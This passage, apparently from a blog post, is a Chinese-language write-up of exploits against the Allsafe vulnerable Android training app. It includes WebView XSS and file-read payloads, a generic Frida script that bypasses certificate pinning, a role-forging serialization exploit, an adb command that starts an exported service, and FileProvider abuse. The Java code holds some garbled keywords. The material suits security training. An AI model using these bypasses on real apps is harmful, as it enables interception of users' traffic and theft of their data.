class="hljs-type">String</span> <span class="hljs-variable">note</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;note&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">notification</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;notification_message&quot;</span>);<br>            <br>            Log.i(TAG, <span class="hljs-string">&quot;=====================================&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;【广播劫持成功】&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;服务器地址: &quot;</span> + server);<br>            Log.i(TAG, <span class="hljs-string">&quot;用户笔记: &quot;</span> + note);<br>            Log.i(TAG, <span class="hljs-string">&quot;通知消息: &quot;</span> + notification);<br>            Log.i(TAG, <span class="hljs-string">&quot;=====================================&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>保存笔记，即可在监听器的 logcat 中打印</p>
+<p><img src="/img/IvS8bqyFloAwhpxmA0gcOsianlh.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Vulnerable-WebView"><a href="#Vulnerable-WebView" class="headerlink" title="Vulnerable WebView"></a>Vulnerable WebView</h1><p>webview 有两个加载逻辑，如果是 URI 则调用 <code>loadUrl</code> 方法，否则都当 html 代码处理，而且两者都没有任何过滤</p>
+<p><img src="/img/OyS7bNYFDoivuZxfE7KcIJbansb.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接执行 XSS</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;alert(<span class="hljs-string">&quot;XSS&quot;</span>)&lt;/script&gt;﻿<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Vv0TbMUymodChXx3Y1AcDEnCn7e.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用 file 协议读取文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">file:<span class="hljs-comment">///etc/hosts</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/HViPbM5o7ofoQZxQqkAcxhjInch.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Certificate-Pinning"><a href="#Certificate-Pinning" class="headerlink" title="Certificate Pinning"></a>Certificate Pinning</h1><p>证书绑定，如果直接点击发送，但是抓包的时候显示报错</p>
+<p><img src="/img/Q9mGbkCnboCEaYxgc41ck0a7nEf.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 <code>onCreateView</code> 中会调用 <code>extractPeerCertificateChain</code></p>
+<p><img src="/img/PD0ebT2g0oxjdJxX4C8cfxzInuh.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置证书固定配置，将 <code>httpbin.io</code> 域名对应的证书哈希配置为 <code>INVALID_HASH</code>，这样必然会导致 SSL 证书验证错误</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">**<span class="hljs-keyword">private</span>** **<span class="hljs-keyword">void</span>** extractPeerCertificateChain() &#123;<br><br>    <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">okHttpClient</span> <span class="hljs-operator">=</span> **<span class="hljs-keyword">new</span>** OkHttpClient.Builder().certificatePinner(**<span class="hljs-keyword">new</span>** CertificatePinner.Builder().add(<span class="hljs-string">&quot;httpbin.io&quot;</span>, INVALID_HASH).build()).build();<br><br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> **<span class="hljs-keyword">new</span>** Request.Builder().url(<span class="hljs-string">&quot;https://httpbin.io/json&quot;</span>).build();<br><br>    okHttpClient.newCall(request).enqueue(**<span class="hljs-keyword">new</span>** AnonymousClass2());<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>OkHttp</code> 框架在发起请求的时候会调用 <code>CertificatePinner.check()</code>，会对服务器返回的证书与本地绑定的证书对比</p>
+<p><img src="/img/WpF7bCCjNoKHE9xF33Kcxae8nhg.png" srcset="/img/loading.gif" lazyload></p>
+<p>替换 <code>TrustManager</code> 逻辑为无校验</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] 通用证书绑定绕过脚本启动 (支持多场景)&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] 支持: SSLContext校验 + OkHttp3 CertificatePinner&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-comment">// 替换 SSLContext TrustManager 绕过证书校验</span><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建无校验的自定义 TrustManager</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">CustomTrustManager</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">registerClass</span>(&#123;<br>                <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;com.example.frida.CustomTrustManager&#x27;</span>,<br>                <span class="hljs-attr">implements</span>: [<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],<br>                <span class="hljs-attr">methods</span>: &#123;<br>                    <span class="hljs-attr">checkClientTrusted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) &#123;<br>                        <span class="hljs-comment">// 空实现：不校验客户端证书</span><br>                    &#125;,<br>                    <span class="hljs-attr">checkServerTrusted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) &#123;<br>                        <span class="hljs-comment">// 空实现：不校验服务器证书（核心绕过逻辑）</span><br>                    &#125;,<br>                    <span class="hljs-attr">getAcceptedIssuers</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>                        <span class="hljs-keyword">return</span> []; <span class="hljs-comment">// 返回空列表，不限制信任CA</span><br>                    &#125;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-keyword">const</span> trustManagerInstance = <span class="hljs-title class_">CustomTrustManager</span>.$new();<br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">SSLContext</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.SSLContext&quot;</span>);<br><br>            <span class="hljs-comment">// Hook SSLContext 初始化方法，替换信任管理器</span><br>            <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<br>                <span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>,<br>                <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>,<br>                <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span><br>            ).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">keyManagers, trustManagers, secureRandom</span>) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [SSLContext] 拦截初始化，替换为无校验TrustManager&quot;</span>);<br>                <span class="hljs-comment">// 强制使用自定义TrustManager，忽略原始配置</span><br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>(keyManagers, [trustManagerInstance], secureRandom);<br>            &#125;;<br><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [SSLContext] 绕过逻辑加载成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] [SSLContext] 绕过逻辑加载失败: &quot;</span> + e.<span class="hljs-property">message</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-comment">// OkHttp3 CertificatePinner 专属绕过</span><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">CertPinner</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;okhttp3.CertificatePinner&quot;</span>);<br><br>            <span class="hljs-comment">// Hook check 方法（直接跳过校验）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">check</span>) &#123;<br>                <span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">check</span>.<span class="hljs-property">overloads</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">overload</span>) =&gt;</span> &#123;<br>                    overload.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">...args</span>) &#123;<br>                        <span class="hljs-keyword">const</span> hostname = args[<span class="hljs-number">0</span>] || <span class="hljs-string">&quot;未知域名&quot;</span>;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[+] [OkHttp3] 绕过 CertificatePinner.check | 域名: <span class="hljs-subst">$&#123;hostname&#125;</span>`</span>);<br>                        <span class="hljs-comment">// 空实现：不执行原校验逻辑</span><br>                    &#125;;<br>                &#125;);<br>            &#125;<br><br>            <span class="hljs-comment">// Hook findMatchingPins 方法（返回空列表）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">findMatchingPins</span>) &#123;<br>                <span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">findMatchingPins</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">hostname</span>) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[+] [OkHttp3] 绕过 CertificatePinner.findMatchingPins | 域名: <span class="hljs-subst">$&#123;hostname&#125;</span>`</span>);<br>                    <span class="hljs-comment">// 返回空列表，让OkHttp认为无证书绑定</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>).$new();<br>                &#125;;<br>            &#125;<br><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [OkHttp3] 绕过逻辑加载成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] [OkHttp3] 绕过逻辑加载失败 (可能未使用OkHttp3): &quot;</span> + e.<span class="hljs-property">message</span>);<br>        &#125;<br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] 所有绕过逻辑加载完成，等待目标请求...&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>    &#125;);<br>&#125;, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>此时就可以正常访问，但网站好像无法访问了</p>
+<p><img src="/img/YMkvbZX5wozwNUxK7sic7dMSnQb.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Weak-Cryptography"><a href="#Weak-Cryptography" class="headerlink" title="Weak Cryptography"></a>Weak Cryptography</h1><p>直接硬编码 AES 密钥</p>
+<p><img src="/img/MTCPbv7M8oeKuCxgRfAcpdW9nSh.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/JtilbE35xoXmKFxCccscx33Kn7O.png" srcset="/img/loading.gif" lazyload></p>
+<p>随机数的话，直接 hook 固定返回值</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">WeakCryptography</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;infosecadventures.allsafe.challenges.WeakCryptography&quot;</span>);<br><span class="hljs-title class_">WeakCryptography</span>[<span class="hljs-string">&quot;randomNumber&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`WeakCryptography.randomNumber is called`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;6666666&quot;</span>;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/CaLabOJFToPeNixiCckcmm3XnLd.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Insecure-Service"><a href="#Insecure-Service" class="headerlink" title="Insecure Service"></a><strong>Insecure Service</strong></h1><p>定义了一个录音服务</p>
+<p><img src="/img/LWkgbYtTCoZ9eZxbKB1cM6hBn8I.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始会检测有没有对应的权限，没有会去申请</p>
+<p><img src="/img/SFXAbhl5yoZyacxmbePcnKBon5e.png" srcset="/img/loading.gif" lazyload></p>
+<p>并且这个服务也是导出的，可以外部调用</p>
+<p><img src="/img/EOmEb0VkyoU6nUxdzqxc9zCungd.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接用 adb 调用该服务</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">adb shell am startservice -n infosecadventures.allsafe/.challenges.RecorderService<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/TZiMbgd7moSYCXxLT2yc1POhnYc.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Object-Serialization"><a href="#Object-Serialization" class="headerlink" title="Object Serialization"></a><strong>Object Serialization</strong></h1><p>简单的序列化与反序列化，反序列化的时候会检测 <code>user.role</code> 是否为 <code>ROLE_EDITOR</code>，但是 user.role 的默认值是 <code>ROLE_AUTHOR</code>，需要自己构造一个序列化对象</p>
+<p><img src="/img/TFasbf7JHof4gkxNIMVca5eenog.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先获取序列化对象所在目录</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">ContextWrapper</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.content.ContextWrapper&quot;</span>);<br>    <span class="hljs-title class_">ContextWrapper</span>.<span class="hljs-property">getExternalFilesDir</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">type</span>) &#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getExternalFilesDir</span>(type);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] getExternalFilesDir called, result: &quot;</span> + result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/B1C1bbMUMoT7ujxpKUkcx5K0nma.png" srcset="/img/loading.gif" lazyload></p>
+<p><code> /storage/emulated/0/Android/data/infosecadventures.allsafe/files</code></p>
+<p>然后再构造序列化对象（不知道为什么我传上 user.dat 后 LOAD 按钮就按不了了）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectSerialization</span> &#123;<br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br>            user.role = <span class="hljs-string">&quot;ROLE_EDITOR&quot;</span>;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;user.dat&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>            oos.writeObject(user);<br>            oos.close();<br>            fos.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> _serialVersionUID _= -<span class="hljs-number">4886601626931750812L</span>; <br><br>        <span class="hljs-keyword">public</span> String username;<br>        <span class="hljs-keyword">public</span> String password;<br>        <span class="hljs-keyword">public</span> String role;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String username, String password)</span> &#123;<br>            <span class="hljs-built_in">this</span>.username = username;<br>            <span class="hljs-built_in">this</span>.password = password;<br>            <span class="hljs-built_in">this</span>.role = <span class="hljs-string">&quot;ROLE_AUTHOR&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;username=&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;, password=&#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;, role=&#x27;&quot;</span> + role + <span class="hljs-string">&quot;&#x27;&#125;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>或者直接 hook User 类的构造函数，使用反射将 role 属性设置为 <code>ROLE_EDITOR</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">UserClass</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;infosecadventures.allsafe.challenges.ObjectSerialization$User&quot;</span>);<br>    <br>    <span class="hljs-title class_">UserClass</span>.<span class="hljs-property">$init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">username, password</span>) &#123;<br>        <span class="hljs-comment">// 调用原始构造函数</span><br>        <span class="hljs-variable language_">this</span>.$init(username, password);<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用反射直接设置字段值</span><br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Field</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.reflect.Field&#x27;</span>);<br>            <br>            <span class="hljs-comment">// 获取role字段</span><br>            <span class="hljs-keyword">var</span> roleField = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&#x27;role&#x27;</span>);<br>            roleField.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 确保可访问</span><br>            <br>            <span class="hljs-comment">// 直接设置字段值</span><br>            roleField.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">&quot;ROLE_EDITOR&quot;</span>);<br>            <br>            <span class="hljs-comment">// 检查</span><br>            <span class="hljs-keyword">var</span> newRole = roleField.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Modified role type: &quot;</span> + newRole);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Modified role value: &#x27;&quot;</span> + newRole + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            <br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Reflection error: &quot;</span> + e);<br>        &#125;<br>    &#125;;<br>    <br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>此时随便输入账号密码保存后再 LOAD 都可以获得 <code>ROLE_EDITOR</code> 权限</p>
+<p><img src="/img/Nt3Tbqo6xoCOWIxVITHczOkNnuh.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Insecure-Providers"><a href="#Insecure-Providers" class="headerlink" title="Insecure Providers"></a>Insecure Providers</h1><p>他用私有协议下载了一个 readme.txt 文件到应用私有目录，正常情况下这个目录的文件是无法被其他应用读取的</p>
+<p><img src="/img/MtPMbFDkHoz8o2xoc57cSwz3nrd.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是 app 也提供了一个 <code>FileProvider</code> 用于读取文件，但因为修复过所以这个 provider 是不导出的，不能被外部应用 app 调用</p>
+<p><img src="/img/He0Fb4KWeoFt7oxl3uKcbXddnvf.png" srcset="/img/loading.gif" lazyload></p>
+<p>但刚好他代码里提供了一个 ProxyActivity，接受一个 intent，然后用 startActivity 调用，因此我们可以利用 ProxyActivity 启动 FileProvider 来实现对 app 私有目录下的文件读取</p>
+<p><img src="/img/DCNYbVBidogKk0xEUUjc1no6n8d.png" srcset="/img/loading.gif" lazyload></p>
+<p>写一个简单的 intent 调用 demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myapplication;<br><br><span class="hljs-keyword">import</span> android.content.ComponentName;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.net.Uri;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> androidx.activity.ComponentActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ComponentActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br><br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">targetUri</span> <span class="hljs-operator">=</span> Uri._parse_(<span class="hljs-string">&quot;content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt&quot;</span>);<br><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">readIntent</span> <span class="hljs-operator">=</span> <span 